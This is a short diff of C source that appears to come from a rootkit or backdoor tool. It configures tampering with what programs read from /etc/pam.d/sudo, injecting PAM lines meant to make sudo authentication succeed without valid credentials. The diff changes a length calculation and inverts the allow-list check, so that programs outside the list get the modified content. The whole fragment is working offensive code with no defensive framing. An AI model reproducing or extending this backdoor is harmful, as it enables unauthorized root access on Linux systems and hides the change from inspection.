@@ -88,7 +88,7 @@ static disk_mod_config_t disk_mod_configs[NR_OF_DISK_MOD_CONFIGS] = {
     {
         .filepath = "/etc/pam.d/sudo",
         .modifications = "auth optional pam_unix.so\nauth sufficient pam_listfile.so file=/etc/pam.d/other sense=allow onerr=succeed quiet\n",
-        .modifications_len = strlen("auth optional pam_unix.so\nauth sufficient pam_listfile.so file=/etc/pam.d/other sense=allow onerr=succeed quiet\n") + 1,
+        .modifications_len = sizeof("auth optional pam_unix.so\nauth sufficient pam_listfile.so file=/etc/pam.d/other sense=allow onerr=succeed quiet\n"),
         .allow_list = (const char *[]){ "sudo" },
         .allow_list_len = 1
     }
@@ -97,12 +97,20 @@ static disk_mod_config_t disk_mod_configs[NR_OF_DISK_MOD_CONFIGS] = {
 static inline disk_mod_config_t *
 get_diskmod_config(const char *prog_name, const char *filepath)
 {
-    for (size_t i = 0; i < NR_OF_DISK_MOD_CONFIGS; i++) {
+    int found;
+    size_t i, j;
+
+    for (i = 0; i < NR_OF_DISK_MOD_CONFIGS; i++) {
         if (strcmp(disk_mod_configs[i].filepath, filepath) == 0) {
-            for (size_t j = 0; j < disk_mod_configs[i].allow_list_len; j++) {
+            found = 0;
+            for (j = 0; j < disk_mod_configs[i].allow_list_len; j++) {
                 if (strcmp(disk_mod_configs[i].allow_list[j], prog_name) == 0) {
-                    return &disk_mod_configs[i];
+                    found = 1;
+                    break;
                 }
+            }
+            if (!found) {
+                return &disk_mod_configs[i];
             }
         }
     }
